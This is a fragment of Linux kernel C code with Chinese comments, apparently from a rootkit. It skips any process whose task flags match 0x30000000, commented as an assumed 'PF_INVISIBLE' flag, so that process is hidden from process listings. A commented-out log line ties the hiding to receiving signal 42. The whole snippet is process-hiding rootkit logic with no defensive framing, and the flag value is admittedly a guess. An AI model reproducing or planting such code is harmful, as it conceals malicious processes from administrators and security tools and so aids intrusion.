...
//                   iter.task->pid,
//                   (iter.task->flags & 0x30000000) ? "hidden" : "visible");
        // 隐藏标志的检查
        if (iter.task->flags & 0x30000000) { // 假设 0x30000000 是 PF_INVISIBLE 标志
           // printk(KERN_INFO "Hiding process %u (pid=%d) due to signal 42 received\n", iter.tgid, iter.task->pid);
            put_task_struct(iter.task); // 释放引用
            continue; // 隐藏这个进程，跳过后续处理
        }else {
            // 打印 flags 值
            //printk(KERN_INFO "Process %u (pid=%d) flags: 0x%x\n", iter.tgid, iter.task->pid, iter.task->flags);
        }
